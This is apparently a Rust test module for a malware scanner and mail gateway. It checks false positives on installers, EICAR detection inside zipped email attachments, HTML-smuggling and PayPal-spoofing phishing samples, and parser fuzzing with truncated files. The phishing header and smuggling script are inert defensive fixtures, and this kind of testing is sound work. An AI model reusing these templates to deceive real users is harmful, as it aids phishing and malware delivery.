            scan_buffer_layers("C:\\Downloads\\setup.msi", "setup.msi", &msi_buf, "f1", 0, false)
                .is_none(),
            "MSI package with incidental 0xE280AE bytes in CAB stream must not false-positive"
        );
        assert!(
            evaluate_motw_payload_risk(
                "C:\\Downloads\\setup.msi",
                "setup.msi",
                &msi_buf,
                "f1",
                7.42
            )
            .is_none(),
            "Downloaded .msi installer with MotW and high CAB entropy must not false-positive"
        );

        // 2. Legitimate 7-Zip / Mozilla SFX installer (e.g., Firefox Installer.exe)
        let mut firefox_sfx = b"MZ\x90\x007-Zip SFX\x00Mozilla Firefox\x00logins.json\x00CryptUnprotectData\x00UPX!\x00".to_vec();
        for i in 0..=255u8 {
            firefox_sfx.push(i);
        }
        assert!(
            scan_buffer_layers(
                "C:\\Downloads\\Firefox Installer.exe",
                "Firefox Installer.exe",
                &firefox_sfx,
                "f2",
                0,
                false
            )
            .is_none(),
            "Firefox Installer.exe SFX stub must not false-positive"
        );

        // 3. In-progress browser downloads (.crdownload / .part) and .yar rule files are excluded
        assert!(is_excluded_path(Path::new(
            r"C:\Users\Alice\Downloads\Unconfirmed 259550.crdownload"
        )));
        assert!(is_excluded_path(Path::new(
            r"C:\Users\Alice\Downloads\installer.msi.part"
        )));
        assert!(is_excluded_path(Path::new(
            r"C:\Users\Alice\rules\cve_sentinel_heuristics.yar"
        )));

        // 4. Clean up any legacy false-positive quarantine items on the local dev machine & verify real Firefox Installer + MSI scan clean
        for item in crate::quarantine::list_quarantined_items() {
            if item.original_path.ends_with("Firefox Installer.exe") {
                let _ = crate::quarantine::restore_quarantined_file(&item.id);
            } else if item.original_path.contains("\\AppData\\Local\\Temp\\")
                || item.original_path.ends_with(".crdownload")
                || item.original_path.ends_with(".tmp")
            {
                let _ = crate::quarantine::delete_quarantined_file(&item.id);
            }
        }
        let ff_path = Path::new(r"C:\Users\Coraj\Downloads\Firefox Installer.exe");
        if ff_path.exists() {
            let (_, ff_buf) = hash_and_sample(ff_path).unwrap();
            assert!(
                scan_buffer_layers(
                    &ff_path.to_string_lossy(),
                    "Firefox Installer.exe",
                    &ff_buf,
                    "ff_test_sha",
                    0,
                    false
                )
                .is_none(),
                "Real Firefox Installer.exe on disk must scan 100% clean"
            );
        }
        let msi_path = Path::new(
            r"C:\Users\Coraj\.gemini\antigravity\scratch\Genesis-Seek\src-tauri\target\release\bundle\msi\Genesis.Seek_0.4.0_x64_en-US.msi",
        );
        if msi_path.exists() {
            let (_, msi_real_buf) = hash_and_sample(msi_path).unwrap();
            assert!(
                scan_buffer_layers(
                    "C:\\Downloads\\installer_package.msi",
                    "installer_package.msi",
                    &msi_real_buf,
                    "msi_test_sha",
                    0,
                    false
                )
                .is_none(),
                "Real Windows Installer .msi binary stream must scan 100% clean"
            );
        }
    }

    #[test]
    fn mail_gateway_unpacks_mime_attachments_html_smuggling_and_spoofed_headers() {
        // 1. Multi-part .eml with a Base64-encoded .zip attachment containing EICAR
        let eicar = eicar_test_string();
        let zip_eicar = build_minimal_zip(&[("invoice_detail.txt", eicar.as_bytes(), false)]);
        let b64_zip = base64::engine::general_purpose::STANDARD.encode(&zip_eicar);
        let eml_zip = format!(
            "From: sender@example.org\r\n\
             To: user@company.org\r\n\
             Subject: Monthly Statement\r\n\
             MIME-Version: 1.0\r\n\
             Content-Type: multipart/mixed; boundary=\"BOUND_123\"\r\n\r\n\
             --BOUND_123\r\n\
             Content-Type: text/plain; charset=\"utf-8\"\r\n\r\n\
             Please find attached.\r\n\
             --BOUND_123\r\n\
             Content-Type: application/zip; name=\"statement.zip\"\r\n\
             Content-Disposition: attachment; filename=\"statement.zip\"\r\n\
             Content-Transfer-Encoding: base64\r\n\r\n\
             {}\r\n\
             --BOUND_123--\r\n",
            b64_zip
        );
        let rep_zip = inspect_raw_email_gateway("test.eml", eml_zip.as_bytes(), 0);
        assert!(!rep_zip.safe);
        assert_eq!(rep_zip.verdict, "REJECT_MALWARE");
        assert_eq!(rep_zip.attachments_inspected, 1);
        assert_eq!(
            rep_zip.threat_name.as_deref(),
            Some("EICAR-Standard-AV-Test-Signature")
        );

        // Also verify scan_buffer_layers on .eml catches it
        let det_eml = scan_buffer_layers("mail.eml", "mail.eml", eml_zip.as_bytes(), "e1", 0, false);
        assert_eq!(
            det_eml.map(|d| d.threat_name).as_deref(),
            Some("EICAR-Standard-AV-Test-Signature")
        );

        // 2. Quoted-Printable HTML Smuggling email (Blob + createObjectURL + atob)
        let eml_smuggle = "From: alert@cdn-drop.org\r\n\
            Subject: Document Shared\r\n\
            MIME-Version: 1.0\r\n\
            Content-Type: text/html; charset=utf-8\r\n\
            Content-Transfer-Encoding: quoted-printable\r\n\r\n\
            <html><body><script>\r\n\
            var data =3D window.atob('TVqQAAMAAAAEAAAA');\r\n\
            var b =3D new Blob([new Uint8Array(16)], {type: 'application/octet-stream'});\r\n\
            var u =3D URL.createObjectURL(b);\r\n\
            </script></body></html>\r\n";
        let rep_smug = inspect_raw_email_gateway("smuggle.eml", eml_smuggle.as_bytes(), 0);
        assert!(!rep_smug.safe);
        assert_eq!(
            rep_smug.threat_name.as_deref(),
            Some("Heur.Mail.HTMLSmugglingDropper")
        );

        // 3. Brand/Display-Name Spoof + SPF/DMARC fail + Reply-To mismatch
        let eml_phish = "From: \"PayPal Security <security@paypal.com>\" <mailer@offshore-drop.ru>\r\n\
            Reply-To: harvest@evil-collector.ru\r\n\
            Authentication-Results: mx.google.com; spf=fail; dkim=fail; dmarc=fail\r\n\
            Subject: Urgent: Verify your account immediately\r\n\
            MIME-Version: 1.0\r\n\
            Content-Type: text/plain\r\n\r\n\
            Please verify your account immediately as your payment suspended.\r\n";
        let rep_phish = inspect_raw_email_gateway("phish.eml", eml_phish.as_bytes(), 0);
        assert!(!rep_phish.safe);
        assert_eq!(rep_phish.verdict, "QUARANTINE_PHISHING");
        assert_eq!(
            rep_phish.threat_name.as_deref(),
            Some("Heur.Mail.PhishingHeaderSpoof")
        );

        // 4. Legitimate authenticated email with clean text attachment is CLEAN
        let eml_clean = "From: \"GitHub Notifications\" <notifications@github.com>\r\n\
            Authentication-Results: mx.google.com; spf=pass; dkim=pass; dmarc=pass\r\n\
            Subject: Release v0.4.0 published\r\n\
            MIME-Version: 1.0\r\n\
            Content-Type: text/plain\r\n\r\n\
            All checks have passed on https://github.com/Coraje187/Genesis-Seek.\r\n";
        let rep_clean = inspect_raw_email_gateway("clean.eml", eml_clean.as_bytes(), 0);
        assert!(rep_clean.safe);
        assert_eq!(rep_clean.verdict, "CLEAN");
    }

    #[test]
    fn fuzz_resilience_malformed_and_truncated_parser_inputs_never_panic() {
        // Feeds truncated, cyclic, and hostile byte sequences into every container/document parser
        // (.zip, .tar.gz, PDF FlateDecode, MS-SHLLINK .lnk, OLE2 .msi, RFC 5322 MIME .eml)
        let hostile_payloads: Vec<(&str, Vec<u8>)> = vec![
            ("truncated.zip", vec![b'P', b'K', 0x03, 0x04, 0xFF, 0xFF, 0x00]),
            ("corrupt_cd.zip", vec![b'P', b'K', 0x01, 0x02, 0x99, 0x88, 0x77, 0x66]),
            ("truncated.tar.gz", vec![0x1F, 0x8B, 0x08, 0x00, 0xDE, 0xAD, 0xBE, 0xEF]),
            (
                "truncated.pdf",
                b"%PDF-1.7\n1 0 obj << /Filter /FlateDecode /OpenAction /JS >>\nstream\n\x78\x9c\xFF\x00\nendstream".to_vec(),
            ),
            (
                "truncated.lnk",
                vec![0x4C, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0xFF, 0xFF],
            ),
            (
                "truncated.msi",
                vec![0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1, 0x00, 0x01],
            ),
            (
                "recursive_boundary.eml",
                b"Content-Type: multipart/mixed; boundary=\"A\"\r\n\r\n--A\r\nContent-Type: multipart/mixed; boundary=\"A\"\r\n\r\n--A--\r\n".to_vec(),
            ),
            (
                "invalid_b64_qp.eml",
                b"From: <a@b.c>\r\nContent-Transfer-Encoding: base64\r\n\r\n!!!!not_valid_base64====\r\n".to_vec(),
            ),
        ];

        for (name, bytes) in hostile_payloads {
            let _ = scan_buffer_layers(name, name, &bytes, "fuzz_sha", 0, false);
            let _ = inspect_raw_email_gateway(name, &bytes, 0);
        }
    }
}
